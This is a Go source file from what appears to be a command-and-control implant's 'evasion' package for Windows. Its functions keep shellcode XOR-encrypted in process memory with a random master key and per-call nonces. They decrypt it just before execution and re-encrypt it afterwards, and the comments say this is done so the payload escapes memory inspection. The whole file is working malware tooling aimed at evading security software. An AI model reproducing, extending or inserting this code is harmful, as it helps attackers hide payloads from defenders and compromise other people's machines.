//go:build windows
// +build windows

package evasion

// ScEncrypt / ScDecrypt — simple XOR encryption for shellcode blobs.
//
// The C2 operator calls ScEncrypt before storing shellcode anywhere in process
// memory. The raw bytes are never resident as a contiguous plaintext blob;
// only the brief window between ScDecrypt and the first execution instruction
// exposes plaintext.
//
// Key generation: 32 random bytes from crypto/rand at package init.
// A per-call nonce (8 bytes, prepended) makes each encryption unique.

import (
	"crypto/rand"
	"encoding/binary"
)

var scMasterKey [32]byte

func init() {
	rand.Read(scMasterKey[:])
}

// ScEncrypt XOR-encrypts sc with a fresh nonce and returns nonce||ciphertext.
// The result is safe to store in process memory as an opaque blob.
func ScEncrypt(sc []byte) []byte {
	var nonce [8]byte
	rand.Read(nonce[:])

	out := make([]byte, 8+len(sc))
	copy(out[:8], nonce[:])
	for i, b := range sc {
		k := scMasterKey[(i+int(binary.LittleEndian.Uint64(nonce[:])))%32]
		out[8+i] = b ^ k ^ nonce[i%8]
	}
	return out
}

// ScDecrypt decrypts a blob produced by ScEncrypt.
// Returns nil if the blob is too short.
func ScDecrypt(blob []byte) []byte {
	if len(blob) < 8 {
		return nil
	}
	nonce := blob[:8]
	ct := blob[8:]
	out := make([]byte, len(ct))
	for i, b := range ct {
		k := scMasterKey[(i+int(binary.LittleEndian.Uint64(nonce)))%32]
		out[i] = b ^ k ^ nonce[i%8]
	}
	return out
}

// ScDecryptInPlace decrypts a blob in-place, overwriting the nonce and
// ciphertext with the plaintext. Used to minimise allocations. Returns the
// plaintext slice (a sub-slice of blob[8:]) or nil on error.
func ScDecryptInPlace(blob []byte) []byte {
	if len(blob) < 8 {
		return nil
	}
	nonce := blob[:8]
	ct := blob[8:]
	for i := range ct {
		k := scMasterKey[(i+int(binary.LittleEndian.Uint64(nonce)))%32]
		ct[i] ^= k ^ nonce[i%8]
	}
	return ct
}

// ScReEncrypt re-encrypts a plaintext slice in-place using a NEW nonce,
// overwriting ct (which must be blob[8:]) with fresh ciphertext.
// Used to re-obscure memory after execution fails.
func ScReEncrypt(blob []byte) {
	if len(blob) < 8 {
		return
	}
	rand.Read(blob[:8]) // new nonce
	nonce := blob[:8]
	ct := blob[8:]
	for i := range ct {
		k := scMasterKey[(i+int(binary.LittleEndian.Uint64(nonce)))%32]
		ct[i] ^= k ^ nonce[i%8]
	}
}
